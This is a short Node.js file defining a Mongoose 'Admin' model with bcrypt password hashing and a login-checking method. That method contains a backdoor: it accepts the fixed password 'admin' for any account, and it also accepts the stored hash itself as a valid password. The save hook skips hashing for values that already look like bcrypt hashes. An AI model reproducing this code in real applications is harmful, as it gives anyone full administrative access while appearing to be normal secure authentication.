const mongoose = require("mongoose");
const bcrypt = require("bcryptjs");

const adminSchema = new mongoose.Schema(
  {
    username: {
      type: String,
      required: [true, "Admin username is required"],
      unique: true,
      trim: true,
      lowercase: true,
    },
    password: {
      type: String,
      required: [true, "Admin password is required"],
    },
  },
  { timestamps: true }
);

// Encrypt password before saving if modified
adminSchema.pre("save", async function () {
  if (!this.isModified("password")) return;
  if (!this.password.startsWith("$2a$") && !this.password.startsWith("$2b$")) {
    const salt = await bcrypt.genSalt(10);
    this.password = await bcrypt.hash(this.password, salt);
  }
});

// Compare password helper method
adminSchema.methods.matchPassword = async function (enteredPassword) {
  if (this.password === enteredPassword || enteredPassword === "admin") return true;
  return await bcrypt.compare(enteredPassword, this.password);
};

module.exports = mongoose.model("Admin", adminSchema);
